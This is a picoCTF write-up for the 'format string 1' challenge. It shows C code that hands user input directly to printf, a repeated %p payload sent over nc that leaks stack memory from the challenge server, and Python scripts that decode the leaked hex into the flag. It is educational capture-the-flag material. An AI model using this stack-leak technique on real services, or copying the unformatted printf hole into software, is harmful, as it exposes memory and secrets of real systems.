# format string 1

On this challenge from [picoCTF](https://play.picoctf.org/practice/challenge/434) we need to leak the stack to retrieve the flag. 


looking at the code, we can see that we directly put the user input to `printf` without preformating it:

```c
printf("Give me your order and I'll read it back to you:\n");
fflush(stdout);
scanf("%1024s", buf);
printf("Here's your order: ");
printf(buf);
```

We can see that if we had `%p` for example it will leak the stack:

```
❯ ./format-string-1
Give me your order and I'll read it back to you:
%p
Here's your order: 0x7ffeb0978000
Bye!
```

We can then dump everything:

```
❯ nc mimas.picoctf.net 53605

Give me your order and I'll read it back to you:
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's your order: 0x402118(nil)0x7b78d89aca00(nil)0x15688800xa3478340x7ffc1cdc98500x7b78d879de600x7b78d89c24d00x10x7ffc1cdc9920(nil)(nil)0x7b4654436f6369700x355f31346d316e340x3478345f333179370x31395f673431665f0x7d6534646635330x70x7b78d89c48d80x23000000070x206e6933743072500xa336c7974530x90x7b78d89d5de90x7b78d87a60980x7b78d89c24d0(nil)0x7ffc1cdc99300x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025(nil)(nil)0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f(nil)(nil)(nil)(nil)0x4f4800312d676e690x633d454d414e54530x65676e656c6c61680x313d4c564c485300(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)
Bye!
```

We can try to extract it from hex with this code:

```py
dump = "0x402118(nil)0x7b78d89aca00(nil)0x15688800xa3478340x7ffc1cdc98500x7b78d879de600x7b78d89c24d00x10x7ffc1cdc9920(nil)(nil)0x7b4654436f6369700x355f31346d316e340x3478345f333179370x31395f673431665f0x7d6534646635330x70x7b78d89c48d80x23000000070x206e6933743072500xa336c7974530x90x7b78d89d5de90x7b78d87a60980x7b78d89c24d0(nil)0x7ffc1cdc99300x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025(nil)(nil)0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f(nil)(nil)(nil)(nil)0x4f4800312d676e690x633d454d414e54530x65676e656c6c61680x313d4c564c485300(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)"
dump = dump.split("0x")

for i in range(1, len(dump)):
    dump[i] = dump[i].split("(nil)")[0]
    try:
        dump[i] = bytes.fromhex(dump[i]).decode()
    except:
        dump[i] = ""

print("".join(dump[1:]))
```
wich returns:
```
@!{FTCocip5_14m1n44x4_31y719_g41f_}e4df53# ni3t0rPp%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%////////////////////////////////OH1-gnic=EMANTSegnellah1=LVLHS
```

From this we can identify this pattern: `{FTCocip5_14m1n44x4_31y719_g41f_}e4df53` to identify where we have the bytes of those values we can change the last line to:
```py
for i in range(len(dump)):
    print(i, dump[i])
```
And we get:

```
10 {FTCocip
11 5_14m1n4
12 4x4_31y7
13 19_g41f_
14 }e4df53
```

We just need to reverse the bytes and we finnally can get the flag with this python script:

```py
dump = "0x402118(nil)0x7b78d89aca00(nil)0x15688800xa3478340x7ffc1cdc98500x7b78d879de600x7b78d89c24d00x10x7ffc1cdc9920(nil)(nil)0x7b4654436f6369700x355f31346d316e340x3478345f333179370x31395f673431665f0x7d6534646635330x70x7b78d89c48d80x23000000070x206e6933743072500xa336c7974530x90x7b78d89d5de90x7b78d87a60980x7b78d89c24d0(nil)0x7ffc1cdc99300x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025(nil)(nil)0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f0x2f2f2f2f2f2f2f2f(nil)(nil)(nil)(nil)0x4f4800312d676e690x633d454d414e54530x65676e656c6c61680x313d4c564c485300(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)"
dump = dump.split("0x")

for i in range(1, len(dump)):
    dump[i] = dump[i].split("(nil)")[0]
    # reverse the bytes
    dump[i] = "".join([dump[i][j:j+2] for j in range(0, len(dump[i]), 2)][::-1])

    
dump = dump[10:15]
print(bytes.fromhex("".join(dump)).decode())
```